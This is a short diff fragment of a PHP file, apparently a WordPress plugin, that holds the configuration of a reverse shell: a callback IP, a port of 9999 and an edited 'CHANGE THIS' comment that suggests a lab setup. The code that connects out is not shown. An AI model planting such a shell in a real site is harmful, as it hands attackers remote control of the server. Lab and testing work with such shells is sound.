@@ -12,7 +12,7 @@ Domain Path: /languages
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '10.9.18.15';  // CHANGE THIS
+$ip = '10.9.18.15';  // CHANGE THIS TO THE tan0 IP
 $port = 9999;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
